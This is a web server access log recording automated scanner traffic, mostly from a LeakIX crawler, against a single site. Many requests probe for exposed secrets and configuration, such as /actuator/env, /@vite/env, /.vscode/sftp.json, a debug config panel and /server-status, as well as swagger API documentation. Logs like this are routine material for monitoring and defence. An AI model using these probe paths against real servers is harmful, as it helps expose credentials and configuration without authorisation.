164.92.107.174 - - [15/Oct/2025:20:18:57 +0800] "POST /api/gql HTTP/1.1" 400 154 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
207.154.212.47 - - [15/Oct/2025:20:18:57 +0800] "POST /graphql/api HTTP/1.1" 405 157 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
164.92.107.174 - - [15/Oct/2025:20:18:57 +0800] "GET /swagger-ui.html HTTP/1.1" 200 268 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
207.154.212.47 - - [15/Oct/2025:20:18:58 +0800] "POST /api/gql HTTP/1.1" 400 154 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
164.92.107.174 - - [15/Oct/2025:20:18:58 +0800] "GET /swagger/index.html HTTP/1.1" 200 268 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
207.154.212.47 - - [15/Oct/2025:20:18:58 +0800] "GET /swagger-ui.html HTTP/1.1" 200 268 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
164.92.107.174 - - [15/Oct/2025:20:18:58 +0800] "GET /swagger/swagger-ui.html HTTP/1.1" 200 268 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
207.154.212.47 - - [15/Oct/2025:20:18:59 +0800] "GET /swagger/index.html HTTP/1.1" 200 268 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
164.92.107.174 - - [15/Oct/2025:20:18:59 +0800] "GET /webjars/swagger-ui/index.html HTTP/1.1" 200 268 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
207.154.212.47 - - [15/Oct/2025:20:18:59 +0800] "GET /swagger/swagger-ui.html HTTP/1.1" 200 268 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
164.92.107.174 - - [15/Oct/2025:20:18:59 +0800] "GET /swagger.json HTTP/1.1" 200 268 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
164.92.107.174 - - [15/Oct/2025:20:19:00 +0800] "GET /swagger/v1/swagger.json HTTP/1.1" 200 268 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
207.154.212.47 - - [15/Oct/2025:20:19:00 +0800] "GET /webjars/swagger-ui/index.html HTTP/1.1" 200 268 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
164.92.107.174 - - [15/Oct/2025:20:19:00 +0800] "GET /v2/api-docs HTTP/1.1" 200 268 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
207.154.212.47 - - [15/Oct/2025:20:19:00 +0800] "GET /swagger.json HTTP/1.1" 200 268 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
164.92.107.174 - - [15/Oct/2025:20:19:01 +0800] "GET /v3/api-docs HTTP/1.1" 200 268 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
207.154.212.47 - - [15/Oct/2025:20:19:01 +0800] "GET /swagger/v1/swagger.json HTTP/1.1" 200 268 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
164.92.107.174 - - [15/Oct/2025:20:19:01 +0800] "GET /api-docs/swagger.json HTTP/1.1" 400 154 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
207.154.212.47 - - [15/Oct/2025:20:19:02 +0800] "GET /v2/api-docs HTTP/1.1" 200 268 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
164.92.107.174 - - [15/Oct/2025:20:19:02 +0800] "GET /api/swagger.json HTTP/1.1" 400 154 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
207.154.212.47 - - [15/Oct/2025:20:19:02 +0800] "GET /v3/api-docs HTTP/1.1" 200 268 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
164.92.107.174 - - [15/Oct/2025:20:19:02 +0800] "GET /@vite/env HTTP/1.1" 200 268 "-" "Go-http-client/1.1"
164.92.107.174 - - [15/Oct/2025:20:19:03 +0800] "GET /actuator/env HTTP/1.1" 200 268 "-" "Go-http-client/1.1"
207.154.212.47 - - [15/Oct/2025:20:19:03 +0800] "GET /api-docs/swagger.json HTTP/1.1" 400 154 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
164.92.107.174 - - [15/Oct/2025:20:19:03 +0800] "GET /server HTTP/1.1" 200 268 "-" "Go-http-client/1.1"
207.154.212.47 - - [15/Oct/2025:20:19:03 +0800] "GET /api/swagger.json HTTP/1.1" 400 154 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
164.92.107.174 - - [15/Oct/2025:20:19:04 +0800] "GET /.vscode/sftp.json HTTP/1.1" 200 268 "-" "Go-http-client/1.1"
207.154.212.47 - - [15/Oct/2025:20:19:04 +0800] "GET /@vite/env HTTP/1.1" 200 268 "-" "Go-http-client/1.1"
164.92.107.174 - - [15/Oct/2025:20:19:04 +0800] "GET /about HTTP/1.1" 200 268 "-" "Go-http-client/1.1"
207.154.212.47 - - [15/Oct/2025:20:19:04 +0800] "GET /actuator/env HTTP/1.1" 200 268 "-" "Go-http-client/1.1"
164.92.107.174 - - [15/Oct/2025:20:19:05 +0800] "GET /debug/default/view?panel=config HTTP/1.1" 200 268 "-" "Go-http-client/1.1"
164.92.107.174 - - [15/Oct/2025:20:19:05 +0800] "GET /v2/_catalog HTTP/1.1" 200 268 "-" "Go-http-client/1.1"
207.154.212.47 - - [15/Oct/2025:20:19:05 +0800] "GET /server HTTP/1.1" 200 268 "-" "Go-http-client/1.1"
164.92.107.174 - - [15/Oct/2025:20:19:06 +0800] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 200 268 "-" "Go-http-client/1.1"
104.252.191.135 - - [15/Oct/2025:20:19:06 +0800] "GET / HTTP/1.1" 200 268 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
207.154.212.47 - - [15/Oct/2025:20:19:06 +0800] "GET /.vscode/sftp.json HTTP/1.1" 200 268 "-" "Go-http-client/1.1"
164.92.107.174 - - [15/Oct/2025:20:19:06 +0800] "GET /server-status HTTP/1.1" 200 268 "-" "Go-http-client/1.1"
207.154.212.47 - - [15/Oct/2025:20:19:06 +0800] "GET /about HTTP/1.1" 200 268 "-" "Go-http-client/1.1"
164.92.107.174 - - [15/Oct/2025:20:19:06 +0800] "GET /login.action HTTP/1.1" 200 268 "-" "Go-http-client/1.1"
207.154.212.47 - - [15/Oct/2025:20:19:07 +0800] "GET /debug/default/view?panel=config HTTP/1.1" 200 268 "-" "Go-http-client/1.1"
164.92.107.174 - - [15/Oct/2025:20:19:07 +0800] "GET /_all_dbs HTTP/1.1" 200 268 "-" "Mozilla/5.0 (l9scan/2.0.130313e29323e2333323e24323; +https://leakix.net)"
164.92.107.174 - - [15/Oct/2025:20:19:07 +0800] "GET /.DS_Store HTTP/1.1" 200 268 "-" "Go-http-client/1.1"
